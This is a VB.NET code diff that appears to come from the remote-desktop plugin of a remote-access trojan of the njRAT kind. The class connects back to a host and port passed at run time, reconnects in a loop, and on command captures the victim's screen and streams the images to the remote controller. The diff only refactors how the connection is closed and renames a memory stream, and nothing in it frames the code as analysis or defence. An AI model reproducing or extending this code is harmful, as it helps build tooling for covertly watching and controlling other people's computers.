@@ -8,7 +8,7 @@ Public Class Main
     Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String)
 
         KEY = K
-        Dim M As New IO.MemoryStream ' create memory stream
+        ' create memory stream
         Dim lp As Integer = 0
 
 e:      ' clear things and ReConnect
@@ -73,16 +73,29 @@ rr:
         GoTo re
 
 cc:
-        Try
-            If Not C Is Nothing Then C.Close()
-        Catch ex As Exception
+        CloseMe()
+    End Sub
 
+    Public Shared Sub CloseMe()
+        Try
+            C.Client.Close()
+        Catch ex As Exception
+        End Try
+        Try
+            C.Close()
+        Catch ex2 As Exception
+        End Try
+        C = Nothing
+        Try
+            cap.Clear()
+        Catch ex3 As Exception
         End Try
         Try
             M.Dispose()
-        Catch ex As Exception
+        Catch ex4 As Exception
         End Try
     End Sub
+
     Public Shared bmb = New List(Of Byte())()
     Public Shared cap As New CRDP
     Public Shared Sub Data(ByVal b As Byte())
@@ -101,22 +114,18 @@ cc:
                     Dim Split As Integer = A(2)
                     Dim Quality As Integer = A(3)
                     Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
-                    Dim M As New IO.MemoryStream
+                    Dim MM As New IO.MemoryStream
                     Dim CMD As String = "@" & SPL
-                    M.Write(SB(CMD), 0, CMD.Length)
-                    M.Write(Bb, 0, Bb.Length)
+                    MM.Write(SB(CMD), 0, CMD.Length)
+                    MM.Write(Bb, 0, Bb.Length)
                     Dim obj As List(Of Byte()) = bmb
                     SyncLock obj
-                        Send(M.ToArray)
+                        Send(MM.ToArray)
                     End SyncLock
-                    M.Dispose()
+                    MM.Dispose()
 
                 Case "Close"
-                    Try
-                        C.Close()
-                        C = Nothing
-                    Catch ex As Exception
-                    End Try
+                    CloseMe()
             End Select
 
         Catch ex As Exception
@@ -173,5 +182,6 @@ cc:
     Public Shared _H
     Public Shared _P
     Public Shared SPL As String = "|'L'|"
+    Public Shared M As New IO.MemoryStream
 
 End Class
